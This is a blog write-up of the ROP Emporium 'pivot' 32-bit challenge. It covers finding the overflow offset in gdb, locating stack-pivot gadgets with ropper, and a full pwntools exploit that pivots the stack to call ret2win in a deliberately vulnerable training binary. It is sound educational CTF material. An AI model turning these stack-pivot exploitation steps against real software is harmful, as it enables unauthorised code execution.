---
layout: post
title: ropemporium - pivot 32bit
---

## Summary
Using a new gadget to pivot the stack into a given location where an address is stored. The address is pointing to a function in a library called `libpivot32.so`.

## Description
_There's only enough space for a three-link chain on the stack but you've been given space to stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location._

## Getting started
To get started I ran the executable normally:
```
$ ./pivot32
pivot by ROP Emporium
32bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf7db1f10
Send your second chain now and it will land there
> abc
Now kindly send your stack smash
> abc

Exiting
```
It seems that we already get an address we can pivot to.
Because I need to give two separate inputs I'm gonna be using `pwntools`' `process` functionality to deliver the payloads.
To get the padding I used `pwntools` to generate a string pattern:
```python
>>> from pwn import *
>>> cyclic(50)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
>>> 
```
I ran the program from using `gdb`:
```
$ gdb ./pivot32 -q
Reading symbols from ./pivot32...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/qh/CTF/ropemporium/pivot/32/pivot32
pivot by ROP Emporium
32bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf7db1f10
Send your second chain now and it will land there
> AAAA
Now kindly send your stack smash
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd230 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n")
EBX: 0x0
ECX: 0xf7f8e89c --> 0x0
EDX: 0xffffd230 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n")
ESI: 0xf7f8d000 --> 0x1d9d6c
EDI: 0xf7f8d000 --> 0x1d9d6c
EBP: 0x6161616b ('kaaa')
ESP: 0xffffd260 --> 0xa616d ('ma\n')
EIP: 0x6161616c ('laaa')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6161616c
[------------------------------------stack-------------------------------------]
0000| 0xffffd260 --> 0xa616d ('ma\n')
0004| 0xffffd264 --> 0x0
0008| 0xffffd268 --> 0x2
0012| 0xffffd26c --> 0x0
0016| 0xffffd270 --> 0x1
0020| 0xffffd274 --> 0xffffd334 --> 0xffffd4c0 ("/home/qh/CTF/ropemporium/pivot/32/pivot32")
0024| 0xffffd278 --> 0xf7db1f10 ("AAAA\n")
0028| 0xffffd27c --> 0xf6db2010 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6161616c in ?? ()
gdb-peda$
```
The value of the instruction pointer was `0x6161616c` or `laaa`.
using `pwntools` again I found the correct padding size that I needed.
```
>>> len(fit({'laaa':''}))
44
```
Now I had to get the address of `ret2win`.
I first got the base address of `libpivot32`:
```
$ ldd ./pivot32
        linux-gate.so.1 (0xf7fd2000)
        libpivot32.so => ./libpivot32.so (0xf7fca000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7db3000)
        /lib/ld-linux.so.2 (0xf7fd4000)
```
So the base address is `0xf7fca000`, great.
Then I got the offset of `ret2win`:
```
$ readelf -s libpivot32.so
                                                  
Symbol table '.dynsym' contains 26 entries:       
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     3: 00000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.1.3 (3)
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2)
     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
     7: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses
     8: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
     9: 00000770    43 FUNC    GLOBAL DEFAULT   12 foothold_function
    10: 0000099c     0 FUNC    GLOBAL DEFAULT   13 _fini
    11: 000005c0     0 FUNC    GLOBAL DEFAULT    9 _init
    12: 0000201c     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    13: 00002020     0 NOTYPE  GLOBAL DEFAULT   24 _end
    14: 00000939    46 FUNC    GLOBAL DEFAULT   12 void_function_10
    15: 0000201c     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    16: 0000079b    46 FUNC    GLOBAL DEFAULT   12 void_function_01
    17: 00000967    46 FUNC    GLOBAL DEFAULT   12 ret2win
```
The offset was `967`, so the address of `ret2win` would be `0xf7fca967`.

## Finding useful gadgets
All that was left before creating a ropchain was to find ropgadgets.
I used `ropper` to get the gadgets:
```
$ ropper --file pivot32 --console
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(pivot32/ELF/x86)> stack_pivot



Gadgets
=======


0x0804889b: add esp, 0x10; nop; leave; ret; 
0x08048925: add esp, 0xc; pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0804856e: add esp, 8; pop ebx; ret; 
0x0804856a: ret 0; 
0x080486be: ret 0xeac1; 
0x08048a4c: ret 0xfffd; 
0x080488c2: xchg eax, esp; ret;
```
`0x000008c2: xchg eax, esp; ret;` looks like a good gadget to pivot the stack.
Now a `pop eax` gadget:
```
(pivot32/ELF/x86)> search pop eax
[INFO] Searching for gadgets: pop eax

[INFO] File: pivot32
0x080488c0: pop eax; ret;
```

## Creating a ropchain
Now that I had every piece it was time to put everything together and make a ropchain. 
First I need to put the address of `ret2win` into the first input.
Then to pop the address to pivot to into `eax`.
After that I need to call the pivot gadget.

## Creating the exploit
The exploit for this challenge should be relatively small.
I came up with the following exploit:
```python
from pwn import *

p = process('./pivot32')
ret2win_offset = 0x967
lib_base = 0xf7fca000
pivot_addr = p32(0xf7db1f10)
pop_eax = p32(0x080488c0) #pop eax; ret;
xchg = p32(0x080488c2) # xchg eax, esp; ret;
padding = 'A'*44

#first input
p.recvuntil('> ')
payload = p32(lib_base + ret2win_offset)
p.sendline(payload)

#second input
p.recvuntil('> ')
payload = padding
payload += pop_eax
payload += pivot_addr
payload += xchg
p.sendline(payload)
log.success('flag: {}'.format(p.recv()))
```
First I defined values that I will be using.
Then I called `p.recvuntil('> ')` to get all output from the executable until `> `.
Then I send the address of ret2win into the pivot location using the first input.
After that I called `p.recvuntil('> ')` again.
Then it finally came to the ropchain that I came up with.
First I add the padding, then the address of the `pop eax; ret;` gadget.
The address to pivot to came after that as well as the `xchg eax, esp; ret;` gadget address.
Upon sending the ropchain as the second input the flag will be send as the output of the executable. Which is formatted by the `log.success()` function from `pwntools`.

## Running the exploit
Now it was time I tested my exploit.
```
$ python exploit.py 
[+] Starting local process './pivot32': pid 49816
[+] flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './pivot32' stopped with exit code 0 (pid 49816)
```
Success!